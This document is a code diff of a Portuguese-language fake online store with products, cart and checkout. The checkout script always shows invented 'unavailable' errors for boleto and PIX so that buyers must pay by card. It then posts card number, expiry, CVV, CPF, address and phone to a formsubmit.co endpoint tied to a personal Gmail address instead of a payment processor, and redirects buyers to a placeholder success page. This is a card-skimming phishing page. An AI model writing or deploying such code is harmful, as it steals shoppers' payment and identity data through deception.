+                description: 'Relógio inteligente com Tela AMOLED 1.4". Monitoramento de saúde: frequência cardíaca, oxigênio no sangue, stress. GPS integrado. Bateria de 3 dias. Resistência à água 5ATM. Mais de 100 modos de exercício.'
+            }
         ];
 
         let cart = [];
+        let currentProduct = null;
 
-        function renderProducts() {
-            const grid = document.getElementById('products-grid');
-            grid.innerHTML = products.map(p => `
-                <div class="product-card">
-                    <div class="product-image">${p.image}</div>
-                    <h3>${p.name}</h3>
-                    <p class="description">${p.desc}</p>
-                    <p class="price">R$ ${p.price.toFixed(2).replace('.', ',')}</p>
-                    <button class="add-btn" onclick="addToCart(${p.id}, '${p.name}', ${p.price})">
-                        ➕ Adicionar
-                    </button>
-                </div>
-            `).join('');
-        }
-
-        function addToCart(id, name, price) {
-            const existing = cart.find(i => i.id === id);
-            if (existing) existing.qty++;
-            else cart.push({id, name, price, qty: 1});
-            updateCart();
-        }
-
-        function updateCart() {
-            document.getElementById('cart-count').textContent = cart.reduce((s,i) => s + i.qty, 0);
-            const items = document.getElementById('cart-items');
-            const total = cart.reduce((s,i) => s + (i.price * i.qty), 0);
-            
-            items.innerHTML = cart.map(item => `
-                <div class="cart-item">
-                    <div><strong>${item.name}</strong><br>Qtd: ${item.qty}</div>
-                    <button class="remove-btn" onclick="removeFromCart(${item.id})">🗑️</button>
-                </div>
-            `).join('');
-            
-            document.getElementById('cart-total').textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;;
-        }
-
-        function removeFromCart(id) {
-            cart = cart.filter(i => i.id !== id);
-            updateCart();
-        }
-
-        function openCart() {
-            document.getElementById('cart-modal').classList.add('show');
-        }
-
-        function closeCart() {
-            document.getElementById('cart-modal').classList.remove('show');
-        }
-
-        function goToCheckout() {
-            if (cart.length === 0) {
-                alert('Adicione produtos ao carrinho!');
-                return;
-            }
-            closeCart();
-            document.getElementById('checkout-section').classList.add('show');
-            updateCheckoutSummary();
-        }
-
-        function updateCheckoutSummary() {
-            const items = document.getElementById('order-items');
-            const total = cart.reduce((s,i) => s + (i.price * i.qty), 0);
-            
-            items.innerHTML = cart.map(item => `
-                <div style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #eee;">
-                    <span>${item.name} (${item.qty}x)</span>
-                    <span>R$ ${(item.price * item.qty).toFixed(2).replace('.', ',')}</span>
-                </div>
-            `).join('');
-            
-            document.getElementById('order-total').textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;;
-            document.getElementById('valor_total').value = total.toFixed(2);
-            document.getElementById('produtos_comprados').value = cart.map(i => `${i.name} (${i.qty}x)`).join(' | ');
-        }
-
-        function backToShop() {
-            document.getElementById('checkout-section').classList.remove('show');
-        }
-
-        function toggleCardFields() {
-            const method = document.querySelector('input[name="metodo_pagamento"]:checked').value;
-            const cardFields = document.getElementById('card-fields');
-            if (method === 'cartao') {
-                cardFields.style.display = 'block';
-                cardFields.querySelectorAll('input, select').forEach(f => f.setAttribute('required', ''));
-            } else {
-                cardFields.style.display = 'none';
-                cardFields.querySelectorAll('input, select').forEach(f => f.removeAttribute('required'));
-            }
-        }
-
+        // INICIALIZAR
         document.addEventListener('DOMContentLoaded', function() {
+            renderProducts();
+            setupMasks();
             document.getElementById('timestamp').value = new Date().toLocaleString('pt-BR');
             document.getElementById('user_agent').value = navigator.userAgent;
+        });
+
+        // RENDERIZAR PRODUTOS
+        function renderProducts() {
+            const productsGrid = document.getElementById('productsGrid');
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
             
-            const cpfInput = document.querySelector('input[name="cpf"]');
-            if (cpfInput) {
-                cpfInput.addEventListener('input', function(e) {
+            const filtered = products.filter(p => p.name.toLowerCase().includes(searchTerm));
+            
+            productsGrid.innerHTML = filtered.map(p => `
+                <div class="product-card" onclick="viewProduct(${p.id})">
+                    <img src="${p.image}" alt="${p.name}" class="product-image">
+                    <div class="product-info">
+                        <div class="product-title">${p.name}</div>
+                        <div class="product-desc">${p.description.substring(0, 80)}...</div>
+                        <div class="product-price">R$ ${p.price.toFixed(2).replace('.', ',')}</div>
+                        <button class="add-btn" onclick="event.stopPropagation(); addToCart(${p.id})">➕ Adicionar</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // BUSCAR PRODUTOS
+        function searchProducts() {
+            renderProducts();
+        }
+
+        // VER DETALHES DO PRODUTO
+        function viewProduct(id) {
+            currentProduct = products.find(p => p.id === id);
+            document.getElementById('detailTitle').textContent = currentProduct.name;
+            document.getElementById('detailPrice').textContent = `R$ ${currentProduct.price.toFixed(2).replace('.', ',')}`;
+            document.getElementById('detailDesc').textContent = currentProduct.description;
+            document.getElementById('detailImage').src = currentProduct.image;
+            document.getElementById('detailQty').value = 1;
+            
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('cartPage').classList.remove('show');
+            document.getElementById('checkoutPage').classList.remove('show');
+            document.getElementById('productDetail').classList.add('show');
+        }
+
+        // AUMENTAR/DIMINUIR QUANTIDADE
+        function increaseQty() {
+            document.getElementById('detailQty').value++;
+        }
+        function decreaseQty() {
+            const qty = document.getElementById('detailQty');
+            if (qty.value > 1) qty.value--;
+        }
+
+        // ADICIONAR AO CARRINHO DO DETALHE
+        function addToCartFromDetail() {
+            const qty = parseInt(document.getElementById('detailQty').value);
+            for (let i = 0; i < qty; i++) {
+                addToCart(currentProduct.id);
+            }
+            goCart();
+        }
+
+        // ADICIONAR AO CARRINHO
+        function addToCart(id) {
+            const product = products.find(p => p.id === id);
+            const existing = cart.find(item => item.id === id);
+            
+            if (existing) {
+                existing.quantity++;
+            } else {
+                cart.push({
+                    id: id,
+                    name: product.name,
+                    price: product.price,
+                    image: product.image,
+                    quantity: 1
+                });
+            }
+            
+            updateCartCount();
+        }
+
+        // ATUALIZAR CONTADOR
+        function updateCartCount() {
+            const total = cart.reduce((sum, item) => sum + item.quantity, 0);
+            document.getElementById('cartCount').textContent = total;
+        }
+
+        // NAVEGAR PARA HOME
+        function goHome() {
+            document.getElementById('homePage').style.display = 'block';
+            document.getElementById('productDetail').classList.remove('show');
+            document.getElementById('cartPage').classList.remove('show');
+            document.getElementById('checkoutPage').classList.remove('show');
+        }
+
+        // NAVEGAR PARA CARRINHO
+        function goCart() {
+            updateCartDisplay();
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('productDetail').classList.remove('show');
+            document.getElementById('cartPage').classList.add('show');
+            document.getElementById('checkoutPage').classList.remove('show');
+        }
+
+        // ATUALIZAR EXIBIÇÃO DO CARRINHO
+        function updateCartDisplay() {
+            const cartTableBody = document.getElementById('cartTableBody');
+            const emptyCart = document.getElementById('emptyCart');
+            const cartContent = document.getElementById('cartContent');
+            
+            if (cart.length === 0) {
+                cartContent.style.display = 'none';
+                emptyCart.style.display = 'block';
+            } else {
+                cartContent.style.display = 'block';
+                emptyCart.style.display = 'none';
+                
+                cartTableBody.innerHTML = cart.map(item => `
+                    <tr>
+                        <td>
+                            <img src="${item.image}" class="cart-item-img" alt="${item.name}">
+                            ${item.name}
+                        </td>
+                        <td>R$ ${item.price.toFixed(2).replace('.', ',')}</td>
+                        <td>
+                            <div class="qty-control">
+                                <button onclick="changeQty(${item.id}, -1)">-</button>
+                                <span>${item.quantity}</span>
+                                <button onclick="changeQty(${item.id}, 1)">+</button>
+                            </div>
+                        </td>
+                        <td>R$ ${(item.price * item.quantity).toFixed(2).replace('.', ',')}</td>
+                        <td><button class="remove-btn" onclick="removeFromCart(${item.id})">Remover</button></td>
+                    </tr>
+                `).join('');
+                
+                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+                const frete = 15.00;
+                const total = subtotal + frete;
+                
+                document.getElementById('subtotal').textContent = `R$ ${subtotal.toFixed(2).replace('.', ',')}`;
+                document.getElementById('frete').textContent = `R$ ${frete.toFixed(2).replace('.', ',')}`;
+                document.getElementById('cartTotal').textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;
+            }
+        }
+
+        // ALTERAR QUANTIDADE
+        function changeQty(id, change) {
+            const item = cart.find(i => i.id === id);
+            if (item) {
+                item.quantity += change;
+                if (item.quantity <= 0) {
+                    removeFromCart(id);
+                } else {
+                    updateCartDisplay();
+                    updateCartCount();
+                }
+            }
+        }
+
+        // REMOVER DO CARRINHO
+        function removeFromCart(id) {
+            cart = cart.filter(item => item.id !== id);
+            updateCartDisplay();
+            updateCartCount();
+        }
+
+        // NAVEGAR PARA CHECKOUT
+        function goCheckout() {
+            updateCheckoutSummary();
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('productDetail').classList.remove('show');
+            document.getElementById('cartPage').classList.remove('show');
+            document.getElementById('checkoutPage').classList.add('show');
+            document.getElementById('errorMessage').classList.remove('show');
+            document.getElementById('successBanner').classList.remove('show');
+        }
+
+        // ATUALIZAR RESUMO CHECKOUT
+        function updateCheckoutSummary() {
+            const summaryItems = document.getElementById('summaryItems');
+            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const frete = 15.00;
+            const total = subtotal + frete;
+            
+            summaryItems.innerHTML = cart.map(item => `
+                <div class="summary-item">
+                    <span>${item.name} (${item.quantity}x)</span>
+                    <span>R$ ${(item.price * item.quantity).toFixed(2).replace('.', ',')}</span>
+                </div>
+            `).join('');
+            
+            summaryItems.innerHTML += `
+                <div class="summary-item">
+                    <span>Frete:</span>
+                    <span>R$ ${frete.toFixed(2).replace('.', ',')}</span>
+                </div>
+            `;
+            
+            document.getElementById('summaryTotal').textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;
+            document.getElementById('valor_total').value = total.toFixed(2);
+            document.getElementById('produtos_comprados').value = cart.map(i => `${i.name} (${i.quantity}x)`).join(' | ');
+        }
+
+        // ALTERNAR MÉTODO DE PAGAMENTO
+        function togglePaymentMethod() {
+            const method = document.querySelector('input[name="metodo_pagamento"]:checked').value;
+            const cardFields = document.getElementById('cardFields');
+            const errorMsg = document.getElementById('errorMessage');
+            
+            if (method === 'cartao') {
+                cardFields.classList.add('show');
+                cardFields.querySelectorAll('input').forEach(f => f.setAttribute('required', ''));
+                errorMsg.classList.remove('show');
+            } else if (method === 'boleto') {
+                cardFields.classList.remove('show');
+                cardFields.querySelectorAll('input').forEach(f => f.removeAttribute('required'));
+                errorMsg.classList.add('show');
+                errorMsg.textContent = '❌ Erro: O sistema de Boleto está temporariamente indisponível. Por favor, use Cartão de Crédito.';
+            } else if (method === 'pix') {
+                cardFields.classList.remove('show');
+                cardFields.querySelectorAll('input').forEach(f => f.removeAttribute('required'));
+                errorMsg.classList.add('show');
+                errorMsg.textContent = '❌ Erro: Serviço PIX não está disponível no momento. Por favor, use Cartão de Crédito.';
+            }
+        }
+
+        // SUBMIT CHECKOUT
+        function submitCheckout(event) {
+            event.preventDefault();
+            
+            const method = document.querySelector('input[name="metodo_pagamento"]:checked').value;
+            
+            if (method !== 'cartao') {
+                document.getElementById('errorMessage').classList.add('show');
+                if (method === 'boleto') {
+                    document.getElementById('errorMessage').textContent = '❌ Erro: O sistema de Boleto está temporariamente indisponível. Por favor, use Cartão de Crédito.';
+                } else {
+                    document.getElementById('errorMessage').textContent = '❌ Erro: Serviço PIX não está disponível no momento. Por favor, use Cartão de Crédito.';
+                }
+                return false;
+            }
+            
+            // ENVIAR FORMULÁRIO
+            const form = document.getElementById('checkoutForm');
+            const formData = new FormData(form);
+            
+            fetch('https://formsubmit.co/alertascalp@gmail.com', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('successBanner').classList.add('show');
+                    setTimeout(() => {
+                        window.location.href = 'https://seu-username.github.io/seu-repositorio/sucesso.html';
+                    }, 2000);
+                } else {
+                    document.getElementById('errorMessage').classList.add('show');
+                    document.getElementById('errorMessage').textContent = '❌ Erro ao processar pedido. Tente novamente.';
+                }
+            })
+            .catch(error => {
+                document.getElementById('errorMessage').classList.add('show');
+                document.getElementById('errorMessage').textContent = '❌ Erro na conexão. Tente novamente.';
+            });
+            
+            return false;
+        }
+
+        // MÁSCARAS DE INPUT
+        function setupMasks() {
+            // Máscara CPF
+            document.addEventListener('input', function(e) {
+                if (e.target.name === 'cpf') {
                     let v = e.target.value.replace(/\D/g, '');
                     v = v.replace(/(\d{3})(\d)/, '$1.$2');
                     v = v.replace(/(\d{3})(\d)/, '$1.$2');
                     v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                     e.target.value = v;
-                });
-            }
-            
-            const cardInput = document.querySelector('input[name="numero_cartao"]');
-            if (cardInput) {
-                cardInput.addEventListener('input', function(e) {
+                }
+                
+                // Máscara Cartão
+                if (e.target.name === 'numero_cartao') {
                     let v = e.target.value.replace(/\D/g, '').substring(0, 16);
                     e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
-                });
-            }
-            
-            const validadeInput = document.querySelector('input[name="validade"]');
-            if (validadeInput) {
-                validadeInput.addEventListener('input', function(e) {
+                }
+                
+                // Máscara Validade
+                if (e.target.name === 'validade') {
                     let v = e.target.value.replace(/\D/g, '').substring(0, 4);
                     if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
                     e.target.value = v;
-                });
+                }
+                
+                // Máscara CVV
+                if (e.target.name === 'cvv') {
+                    e.target.value = e.target.value.replace(/\D/g, '');
+                }
+                
+                // Máscara CEP
+                if (e.target.name === 'cep') {
+                    let v = e.target.value.replace(/\D/g, '');
+                    v = v.replace(/(\d{5})(\d)/, '$1-$2');
+                    e.target.value = v;
+                }
+                
+                // Máscara Telefone
+                if (e.target.name === 'telefone') {
+                    let v = e.target.value.replace(/\D/g, '');
+                    v = v.replace(/(\d{2})(\d)/, '($1) $2');
+                    v = v.replace(/(\d{5})(\d)/, '$1-$2');
+                    e.target.value = v;
+                }
+            });
+        }
+
+        // ALTERAR LOGO
+        function toggleLogoModal() {
+            document.getElementById('logoModal').classList.toggle('show');
+        }
+
+        function changeLogo() {
+            const logoInput = document.getElementById('logoInput').value;
+            if (logoInput) {
+                document.getElementById('logoDisplay').textContent = logoInput.substring(0, 2);
+                toggleLogoModal();
+                document.getElementById('logoInput').value = '';
             }
-            
-            renderProducts();
-        });
+        }
     </script>
 </body>
 </html>
